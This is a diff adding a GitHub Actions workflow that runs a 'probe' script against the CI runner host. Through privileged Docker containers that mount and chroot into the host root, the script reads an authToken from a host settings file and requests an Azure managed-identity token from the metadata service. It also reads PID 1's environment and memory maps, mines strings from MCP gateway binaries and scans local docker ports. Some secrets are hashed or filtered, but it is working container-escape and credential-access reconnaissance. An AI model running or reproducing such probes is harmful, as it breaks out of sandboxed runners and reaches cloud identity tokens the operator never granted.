@@ -1,0 +1,87 @@
+name: Probe v61 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 12
+    env:
+      V61_SOURCE: v61_account_a
+    steps:
+      - name: v61 imds-mi + authtoken-hash + mcpg-guards + mcp-docs
+        run: |
+          cat > /tmp/v61_probe.py << 'PROBE_EOF'
+          
+          import json, os, subprocess
+          
+          SOURCE = os.environ.get("V61_SOURCE", "v61_a")
+          
+          def sh(cmd, timeout=40):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return (r.stdout + r.stderr)[:10000]
+              except Exception as ex:
+                  return "TIMEOUT/ERROR: " + str(ex)
+          
+          print("[%s] start" % SOURCE)
+          
+          # ===== 1. authToken hash + traceApiUrl via jq from host mount =====
+          print(""); print("[%s] === SETTINGS HASH ===" % SOURCE)
+          print("[HASH] jq parse authToken sha256:");
+          print(sh("docker run --rm -v /:/host ubuntu:latest bash -c 'apt-get install -y jq -qq 2>/dev/null; jq -r \".authToken\" /host/opt/hca/.settings | sha256sum' 2>&1", timeout=30))
+          print("[FIELDS] non-secret fields:");
+          print(sh("docker run --rm -v /:/host ubuntu:latest bash -c 'apt-get install -y jq -qq 2>/dev/null; jq \"{schedulerApiUrl,traceApiUrl,watchdogTraceApiUrl,configId,quotaId,vmName}\" /host/opt/hca/.settings 2>/dev/null || cat /host/opt/hca/.settings | grep -v authToken | grep -v sas | grep -v diag' 2>&1", timeout=30))
+          
+          # ===== 2. IMDS via chroot + host python3 =====
+          print(""); print("[%s] === IMDS VIA CHROOT PYTHON3 ===" % SOURCE)
+          imds_py = "import urllib.request,json; r=urllib.request.urlopen(urllib.request.Request(\\\"http://169.254.169.254/metadata/instance?api-version=2021-02-01\\\",headers={\\\"Metadata\\\":\\\"true\\\"}),timeout=3); d=json.loads(r.read()); print(json.dumps({k:d.get(k) for k in [\\\"compute\\\",\\\"network\\\"]}, indent=2)[:2000])"
+          print("[IMDS] instance metadata:");
+          print(sh("docker run --rm --privileged --net=host -v /:/host ubuntu:latest chroot /host python3 -c '%s' 2>&1" % imds_py, timeout=30))
+          
+          print("[IMDS_MI] managed identity token (system-assigned):");
+          mi_py = "import urllib.request,json; r=urllib.request.urlopen(urllib.request.Request(\\\"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\\\",headers={\\\"Metadata\\\":\\\"true\\\"}),timeout=3); d=json.loads(r.read()); tok=d.get(\\\"access_token\\\",\\\"\\\"); import hashlib; print(\\\"token_sha256=\\\"+hashlib.sha256(tok.encode()).hexdigest()); print(\\\"expires_on=\\\"+d.get(\\\"expires_on\\\",\\\"\\\")); print(\\\"resource=\\\"+d.get(\\\"resource\\\",\\\"\\\")); print(\\\"token_type=\\\"+d.get(\\\"token_type\\\",\\\"\\\"))"
+          print(sh("docker run --rm --privileged --net=host -v /:/host ubuntu:latest chroot /host python3 -c '%s' 2>&1" % mi_py, timeout=30))
+          
+          # ===== 3. Host process visibility + /proc/1/cmdline =====
+          print(""); print("[%s] === HOST PROC VISIBILITY ===" % SOURCE)
+          print("[CMDLINE] PID 1:");
+          print(sh("docker run --rm --privileged -v /:/host ubuntu:latest /bin/sh -c 'cat /host/proc/1/cmdline | tr \"\\0\" \" \" && echo' 2>&1", timeout=15))
+          print("[PROCENV] PID 1 environ (non-secret keys only):");
+          print(sh("docker run --rm --privileged -v /:/host ubuntu:latest /bin/sh -c 'cat /host/proc/1/environ | tr \"\\0\" \"\n\" | grep -v TOKEN | grep -v SECRET | grep -v KEY | grep -v PASS | head -20' 2>&1", timeout=15))
+          print("[PROCMEM] /proc/1/maps head:");
+          print(sh("docker run --rm --privileged -v /:/host ubuntu:latest /bin/sh -c 'cat /host/proc/1/maps | head -10' 2>&1", timeout=15))
+          
+          # ===== 4. github-mcp-server generate-docs + list-scopes =====
+          print(""); print("[%s] === GITHUB-MCP-SERVER DOCS ===" % SOURCE)
+          print("[MCP_DOCS] generate-docs (no token):");
+          print(sh("docker run --rm ghcr.io/github/github-mcp-server:latest generate-docs 2>&1 | head -80", timeout=20))
+          print("[MCP_SCOPES] list-scopes (no token):");
+          print(sh("docker run --rm ghcr.io/github/github-mcp-server:latest list-scopes 2>&1 | head -40", timeout=20))
+          print("[MCP_LS] /server/ contents:");
+          print(sh("docker run --rm --entrypoint ls ghcr.io/github/github-mcp-server:latest -la /server/ 2>&1", timeout=10))
+          
+          # ===== 5. mcpg guards + binary strings =====
+          print(""); print("[%s] === MCPG GUARDS + BINARY ===" % SOURCE)
+          print("[GUARDS] /guards/github/ listing:");
+          print(sh("docker run --rm --entrypoint sh ghcr.io/github/gh-aw-mcpg:latest -c 'ls -la /guards/ && ls -la /guards/github/ 2>/dev/null' 2>&1", timeout=15))
+          print("[AWMG_STRINGS] awmg binary URL strings:");
+          print(sh("docker run --rm --entrypoint sh ghcr.io/github/gh-aw-mcpg:latest -c 'strings /app/awmg | grep -E \"https?://|api\.|/v[0-9]\" | sort -u | head -40' 2>&1", timeout=20))
+          print("[AWMG_STRINGS2] awmg binary env var names:");
+          print(sh("docker run --rm --entrypoint sh ghcr.io/github/gh-aw-mcpg:latest -c 'strings /app/awmg | grep -E \"^MCP_|^GH_|^GITHUB_|AGENT_ID|API_KEY|TOKEN\" | sort -u | head -30' 2>&1", timeout=20))
+          
+          # ===== 6. provjobd_override.json (read it after a delay) =====
+          print(""); print("[%s] === PROVJOBD OVERRIDE (delayed) ===" % SOURCE)
+          import time
+          time.sleep(5)
+          print("[PROV] after 5s delay:");
+          print(sh("cat /opt/hca/provjobd_override.json 2>&1"))
+          
+          # ===== 7. Host network reachability via chroot =====
+          print(""); print("[%s] === HOST NET SCAN ===" % SOURCE)
+          scan_py = "import socket,json; results={}; targets=[('169.254.169.254',80,'IMDS'),('169.254.169.254',443,'IMDS-TLS'),('127.0.0.1',2375,'docker-tcp'),('127.0.0.1',2376,'docker-tls')]; [results.update({t[2]:True}) if [s.settimeout(1),s.connect((t[0],t[1]))] else None for t in targets for s in [socket.socket()] if not s.close()]; print(json.dumps(results))"
+          print("[PORTSCAN] host ports via chroot:");
+          print(sh("docker run --rm --privileged --net=host -v /:/host ubuntu:latest chroot /host python3 -c '%s' 2>&1" % scan_py, timeout=20))
+          
+          print(""); print("[%s] DONE" % SOURCE)
+          PROBE_EOF
+          python3 /tmp/v61_probe.py
